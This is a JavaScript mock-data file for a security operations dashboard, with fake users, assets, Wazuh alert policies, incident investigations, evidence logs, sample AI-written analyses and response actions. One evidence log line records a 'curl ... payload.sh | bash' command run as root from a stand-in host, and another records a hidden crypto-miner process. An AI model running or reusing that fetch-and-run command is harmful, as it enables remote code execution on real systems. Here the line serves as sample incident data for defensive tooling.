/**
 * Mock data layer for development.
 * This file provides fallback data when the backend API is not available.
 * Replace API calls with real endpoints as the backend is connected.
 */

const mockUsers = [
  { id: 'u-001', username: 'sarah.chen', email: 'sarah.chen@company.com', full_name: 'Sarah Chen', role: 'admin', is_active: true, created_at: '2025-01-15T09:00:00Z' },
  { id: 'u-002', username: 'james.wilson', email: 'james.wilson@company.com', full_name: 'James Wilson', role: 'analyst', is_active: true, created_at: '2025-02-20T14:30:00Z' },
  { id: 'u-003', username: 'aisha.patel', email: 'aisha.patel@company.com', full_name: 'Aisha Patel', role: 'analyst', is_active: true, created_at: '2025-03-10T11:00:00Z' },
  { id: 'u-004', username: 'mike.torres', email: 'mike.torres@company.com', full_name: 'Mike Torres', role: 'engineer', is_active: false, created_at: '2025-01-05T08:00:00Z' },
]

const mockAssets = [
  { id: 'a-001', hostname: 'web-prod-01', ip_address: '10.0.1.15', asset_type: 'server', os: 'Ubuntu 22.04 LTS', wazuh_agent_id: '003', criticality: 'critical', notes: 'Primary web application server', created_at: '2025-01-10T00:00:00Z', updated_at: '2025-06-01T00:00:00Z' },
  { id: 'a-002', hostname: 'db-prod-01', ip_address: '10.0.2.10', asset_type: 'server', os: 'CentOS 8', wazuh_agent_id: '004', criticality: 'critical', notes: 'Primary database server', created_at: '2025-01-10T00:00:00Z', updated_at: '2025-05-15T00:00:00Z' },
  { id: 'a-003', hostname: 'ws-analyst-07', ip_address: '10.0.10.107', asset_type: 'endpoint', os: 'Windows 11 Pro', wazuh_agent_id: '015', criticality: 'medium', notes: null, created_at: '2025-03-20T00:00:00Z', updated_at: '2025-03-20T00:00:00Z' },
  { id: 'a-004', hostname: 'fw-perimeter-01', ip_address: '10.0.0.1', asset_type: 'firewall', os: 'PAN-OS 11.1', wazuh_agent_id: null, criticality: 'critical', notes: 'Perimeter firewall — primary', created_at: '2025-01-05T00:00:00Z', updated_at: '2025-04-10T00:00:00Z' },
  { id: 'a-005', hostname: 'mail-prod-01', ip_address: '10.0.1.20', asset_type: 'server', os: 'Ubuntu 22.04 LTS', wazuh_agent_id: '006', criticality: 'high', notes: 'Mail relay server', created_at: '2025-02-01T00:00:00Z', updated_at: '2025-06-10T00:00:00Z' },
  { id: 'a-006', hostname: 'k8s-node-03', ip_address: '10.0.5.13', asset_type: 'cloud', os: 'Container-Optimized OS', wazuh_agent_id: '021', criticality: 'high', notes: 'Kubernetes worker node — production cluster', created_at: '2025-04-01T00:00:00Z', updated_at: '2025-06-15T00:00:00Z' },
]

const mockPolicies = [
  { id: 'p-001', name: 'Critical Alert Auto-Investigate', description: 'Automatically investigate alerts with rule level 13 or above', is_enabled: true, priority: 100, conditions: { min_level: 13 }, created_at: '2025-01-20T00:00:00Z', updated_at: '2025-06-01T00:00:00Z' },
  { id: 'p-002', name: 'Brute Force Detection', description: 'Investigate SSH and RDP brute force attempts', is_enabled: true, priority: 80, conditions: { rule_ids: ['5710', '5712', '5720', '31103'] }, created_at: '2025-02-15T00:00:00Z', updated_at: '2025-05-20T00:00:00Z' },
  { id: 'p-003', name: 'Malware Detection Rules', description: 'Investigate known malware detection signatures', is_enabled: true, priority: 90, conditions: { rule_ids: ['87101', '87102', '87103', '87104'] }, created_at: '2025-03-01T00:00:00Z', updated_at: '2025-03-01T00:00:00Z' },
  { id: 'p-004', name: 'High-Level Alert Monitor', description: 'Investigate alerts with rule level 10 or above', is_enabled: false, priority: 50, conditions: { min_level: 10 }, created_at: '2025-04-10T00:00:00Z', updated_at: '2025-06-05T00:00:00Z' },
  { id: 'p-005', name: 'File Integrity Monitoring', description: 'Investigate FIM events on critical paths', is_enabled: true, priority: 70, conditions: { rule_ids: ['550', '553', '554'] }, created_at: '2025-05-01T00:00:00Z', updated_at: '2025-05-01T00:00:00Z' },
]

const mockInvestigations = [
  {
    id: 'inv-001',
    alert_id: 'alert-2025-0612-001',
    policy_id: 'p-001',
    title: 'Possible privilege escalation via sudo — web-prod-01',
    description: 'Wazuh detected a suspicious sudo command execution by an unauthorized user on the primary web server.',
    status: 'INVESTIGATING',
    severity: 'critical',
    assigned_to: 'u-002',
    created_by: null,
    closed_at: null,
    created_at: '2025-06-12T14:23:00Z',
    updated_at: '2025-06-12T16:45:00Z',
  },
  {
    id: 'inv-002',
    alert_id: 'alert-2025-0612-002',
    policy_id: 'p-002',
    title: 'SSH brute force attempt from 203.0.113.42',
    description: 'Multiple failed SSH login attempts detected from external IP 203.0.113.42 targeting db-prod-01.',
    status: 'INVESTIGATING',
    severity: 'high',
    assigned_to: 'u-003',
    created_by: null,
    closed_at: null,
    created_at: '2025-06-12T12:05:00Z',
    updated_at: '2025-06-12T15:30:00Z',
  },
  {
    id: 'inv-003',
    alert_id: 'alert-2025-0611-001',
    policy_id: 'p-003',
    title: 'Suspicious binary execution — ws-analyst-07',
    description: 'Wazuh FIM detected an unsigned binary execution in a temporary directory on analyst workstation.',
    status: 'QUEUED',
    severity: 'high',
    assigned_to: null,
    created_by: null,
    closed_at: null,
    created_at: '2025-06-11T22:17:00Z',
    updated_at: '2025-06-11T22:17:00Z',
  },
  {
    id: 'inv-004',
    alert_id: 'alert-2025-0611-002',
    policy_id: 'p-005',
    title: 'Critical file modified — /etc/shadow on db-prod-01',
    description: 'File integrity monitoring detected modification to /etc/shadow outside of expected maintenance window.',
    status: 'CLOSED',
    severity: 'critical',
    assigned_to: 'u-002',
    created_by: null,
    closed_at: '2025-06-12T09:00:00Z',
    created_at: '2025-06-11T18:30:00Z',
    updated_at: '2025-06-12T09:00:00Z',
  },
  {
    id: 'inv-005',
    alert_id: 'alert-2025-0610-001',
    policy_id: 'p-001',
    title: 'Rootkit detection triggered — k8s-node-03',
    description: 'Wazuh rootcheck module detected suspicious hidden files and processes on Kubernetes worker node.',
    status: 'CLOSED',
    severity: 'critical',
    assigned_to: 'u-003',
    created_by: null,
    closed_at: '2025-06-11T14:00:00Z',
    created_at: '2025-06-10T08:00:00Z',
    updated_at: '2025-06-11T14:00:00Z',
  },
  {
    id: 'inv-006',
    alert_id: 'alert-2025-0610-002',
    policy_id: 'p-002',
    title: 'RDP brute force — ws-analyst-07',
    description: 'Multiple failed RDP login attempts from internal subnet 10.0.10.0/24.',
    status: 'CLOSED',
    severity: 'medium',
    assigned_to: 'u-002',
    created_by: null,
    closed_at: '2025-06-10T16:00:00Z',
    created_at: '2025-06-10T06:00:00Z',
    updated_at: '2025-06-10T16:00:00Z',
  },
  {
    id: 'inv-007',
    alert_id: 'alert-2025-0609-001',
    policy_id: 'p-004',
    title: 'Anomalous outbound traffic — mail-prod-01',
    description: 'Unusual volume of outbound SMTP connections to a known spam relay observed.',
    status: 'QUEUED',
    severity: 'medium',
    assigned_to: null,
    created_by: null,
    closed_at: null,
    created_at: '2025-06-09T20:00:00Z',
    updated_at: '2025-06-09T20:00:00Z',
  },
  {
    id: 'inv-008',
    alert_id: 'alert-2025-0609-002',
    policy_id: 'p-001',
    title: 'Unauthorized cron job created — web-prod-01',
    description: 'New cron job created by www-data user with base64-encoded command payload.',
    status: 'INVESTIGATING',
    severity: 'critical',
    assigned_to: 'u-002',
    created_by: null,
    closed_at: null,
    created_at: '2025-06-09T11:15:00Z',
    updated_at: '2025-06-12T10:00:00Z',
  },
]

const mockEvidence = {
  'inv-001': [
    { id: 'ev-001', investigation_id: 'inv-001', source_type: 'wazuh_alert', source_id: '1718198580.123456', data: { rule: { id: '5403', level: 14, description: 'Successful sudo to ROOT executed' }, agent: { id: '003', name: 'web-prod-01', ip: '10.0.1.15' }, full_log: 'Jun 12 14:23:00 web-prod-01 sudo: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash -c "curl http://198.51.100.77/payload.sh | bash"' }, notes: 'Initial triggering alert — suspicious sudo from www-data', collected_by: null, created_at: '2025-06-12T14:23:05Z' },
    { id: 'ev-002', investigation_id: 'inv-001', source_type: 'wazuh_alert', source_id: '1718198590.123457', data: { rule: { id: '510', level: 7, description: 'Host-based anomaly detection event' }, agent: { id: '003', name: 'web-prod-01', ip: '10.0.1.15' }, full_log: 'New process detected: /tmp/.hidden/miner64 --pool stratum+tcp://pool.example.com:3333' }, notes: 'Follow-up alert — potential crypto miner', collected_by: null, created_at: '2025-06-12T14:25:00Z' },
    { id: 'ev-003', investigation_id: 'inv-001', source_type: 'network_log', source_id: null, data: { src_ip: '10.0.1.15', dst_ip: '198.51.100.77', dst_port: 443, bytes_sent: 2048, bytes_recv: 156000, protocol: 'TCP', timestamp: '2025-06-12T14:23:30Z' }, notes: 'Outbound connection to payload delivery server', collected_by: 'u-002', created_at: '2025-06-12T15:00:00Z' },
  ],
  'inv-002': [
    { id: 'ev-004', investigation_id: 'inv-002', source_type: 'wazuh_alert', source_id: '1718193900.654321', data: { rule: { id: '5710', level: 10, description: 'sshd: Attempt to login using a non-existent user' }, agent: { id: '004', name: 'db-prod-01', ip: '10.0.2.10' }, full_log: 'Jun 12 12:05:00 db-prod-01 sshd[12345]: Failed password for invalid user admin from 203.0.113.42 port 45678 ssh2' }, notes: null, collected_by: null, created_at: '2025-06-12T12:05:05Z' },
    { id: 'ev-005', investigation_id: 'inv-002', source_type: 'wazuh_alert', source_id: '1718193960.654322', data: { rule: { id: '5712', level: 10, description: 'sshd: brute force trying to get access to the system' }, agent: { id: '004', name: 'db-prod-01', ip: '10.0.2.10' }, full_log: '87 failed login attempts from 203.0.113.42 in the last 300 seconds' }, notes: 'Brute force threshold exceeded', collected_by: null, created_at: '2025-06-12T12:10:00Z' },
  ],
}

const mockAnalysis = {
  'inv-001': [
    { id: 'an-001', investigation_id: 'inv-001', analysis_type: 'ai', content: '## Summary\n\nThis investigation reveals a **critical web server compromise** on `web-prod-01` (10.0.1.15). The attack chain follows a classic pattern:\n\n1. **Initial Access**: The `www-data` user (web application service account) executed a suspicious `sudo` command to escalate to root.\n2. **Payload Delivery**: A shell script was downloaded from `198.51.100.77` — a known malicious IP associated with cryptomining campaigns.\n3. **Execution**: A hidden binary (`/tmp/.hidden/miner64`) was deployed and connected to a mining pool.\n\n## Risk Assessment\n\n- **Severity**: Critical — root-level compromise of production web server\n- **Impact**: Server integrity compromised, potential lateral movement risk\n- **Scope**: Currently contained to `web-prod-01`, but the attacker has root access\n\n## Recommended Actions\n\n1. **Immediately isolate** `web-prod-01` from the network\n2. **Block** outbound connections to `198.51.100.77` and the mining pool\n3. **Investigate** how `www-data` obtained sudo privileges — check `/etc/sudoers`\n4. **Scan** other servers for similar indicators of compromise\n5. **Preserve** forensic evidence before remediation', confidence: 0.92, model_id: 'gemini-2.5-pro', created_by: null, created_at: '2025-06-12T14:30:00Z' },
  ],
  'inv-002': [
    { id: 'an-002', investigation_id: 'inv-002', analysis_type: 'ai', content: '## Summary\n\nSSH brute force attack detected from external IP `203.0.113.42` targeting `db-prod-01`. The attacker attempted 87 login attempts in 5 minutes using common usernames.\n\n## Analysis\n\n- **Source**: `203.0.113.42` — geo-located to a known VPS provider frequently used for scanning\n- **Target**: `db-prod-01` (10.0.2.10) — critical database server\n- **Status**: All login attempts **failed** — no successful authentication detected\n- **Pattern**: Dictionary attack using common usernames (admin, root, postgres, mysql)\n\n## Recommendations\n\n1. **Block** `203.0.113.42` at the perimeter firewall\n2. **Verify** no successful logins from this IP in auth logs\n3. **Consider** implementing fail2ban or rate limiting for SSH\n4. **Review** whether SSH should be exposed or restricted to VPN only', confidence: 0.88, model_id: 'gemini-2.5-pro', created_by: null, created_at: '2025-06-12T12:15:00Z' },
  ],
}

const mockActions = {
  'inv-001': [
    { id: 'act-001', investigation_id: 'inv-001', action_type: 'isolate_host', description: 'Isolate web-prod-01 from the network via Wazuh active response', status: 'completed', result: 'Host successfully isolated. Network interfaces disabled except management VLAN.', performed_by: null, created_at: '2025-06-12T14:35:00Z', completed_at: '2025-06-12T14:35:30Z' },
    { id: 'act-002', investigation_id: 'inv-001', action_type: 'block_ip', description: 'Block outbound connections to 198.51.100.77 on perimeter firewall', status: 'completed', result: 'Firewall rule added. Connection to 198.51.100.77 blocked on all ports.', performed_by: null, created_at: '2025-06-12T14:36:00Z', completed_at: '2025-06-12T14:36:15Z' },
    { id: 'act-003', investigation_id: 'inv-001', action_type: 'quarantine_file', description: 'Quarantine /tmp/.hidden/miner64 on web-prod-01', status: 'pending', result: null, performed_by: null, created_at: '2025-06-12T14:37:00Z', completed_at: null },
  ],
  'inv-002': [
    { id: 'act-004', investigation_id: 'inv-002', action_type: 'block_ip', description: 'Block 203.0.113.42 at perimeter firewall', status: 'completed', result: 'IP 203.0.113.42 added to global blocklist. Rule ID: FW-2025-0612-001.', performed_by: null, created_at: '2025-06-12T12:20:00Z', completed_at: '2025-06-12T12:20:10Z' },
  ],
}

export const mock = {
  users: mockUsers,
  assets: mockAssets,
  policies: mockPolicies,
  investigations: mockInvestigations,
  evidence: mockEvidence,
  analysis: mockAnalysis,
  actions: mockActions,
}
